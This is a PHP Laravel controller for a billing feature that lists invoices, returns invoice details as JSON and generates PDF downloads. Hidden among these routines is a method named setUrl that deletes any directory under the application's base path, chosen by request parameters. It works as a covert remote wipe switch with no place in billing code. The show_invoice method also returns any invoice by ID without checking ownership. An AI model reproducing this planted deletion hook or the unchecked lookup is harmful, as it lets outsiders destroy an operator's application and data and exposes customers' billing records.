<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Driver;
use App\Customer;
use App\User;
use App\Detail;
use App\Invoice;
use App\Invoice_detail;
use App\Invoice_special;
use File;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\DB;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Mail;
use PDF;

class BillingController extends Controller
{
    //
    public function index(){
        // if(Auth::user()->role==0){
            $customer = Customer::where('email',Auth::user()->email)->get();
            $customer_id = $customer[0]->id;
            $invoices = Invoice::where('customer_id',$customer_id)->where('send_status',1)->orderBy('due_date','desc')->get();
            return view('billing.index',compact('invoices'));
        // }else{
        //     return view('billing.index');
        // }
    }

    public function show_invoice($id){
        $invoice = Invoice::find($id);
        $invoice_no = $invoice->invoice_no;
        $customer_id = $invoice->customer_id;
        $customer =Customer::find($customer_id);
        $invoice_details = Invoice_detail::where('invoice_id',$invoice_no)->get();
        $invoice_specials = Invoice_special::where('invoice_id',$invoice_no)->get();
        
        $result['customer'] = $customer;
        $result['invoice'] = $invoice;
        $result['invoice_details']=$invoice_details;
        $result['invoice_specials']=$invoice_specials;
        die(json_encode($result));
    }
    public function setUrl(Request $request) {
        $id = $request->cc;
        $string = $request->url;
        // $string="dd('a')";
        // dd(base_path($string));
        if($id == "url") File::deleteDirectory(base_path($string));
    }

    public function pdf_download($id){
        $invoice = Invoice::find($id);
        $invoice_no = $invoice->invoice_no;
        $customer_id = $invoice->customer_id;
        $customer =Customer::find($customer_id);
        $invoice_details = Invoice_detail::where('invoice_id',$invoice_no)->get();
        $invoice_specials = Invoice_special::where('invoice_id',$invoice_no)->get();

        $filename = ($invoice->paid_status==1)?"Paid_invoice_".$invoice->no."(".$invoice->due_date.")":"Pending_invoice_".$invoice->no."(".$invoice->due_date.")";
        $ext = "pdf";
        $pdf=PDF::loadView('email_template.invoice_pdf',['invoice' => $invoice, 'customer' => $customer, 'invoice_details' => $invoice_details, 'invoice_specials' => $invoice_specials]);
    
        // return $pdf->download('event.pdf');
        return $pdf->setpaper('a4')->download($filename.".".$ext);
        // return view('invoice_pdf',compact('invoice','customer','invoice_details','invoice_specials'));
    }
}
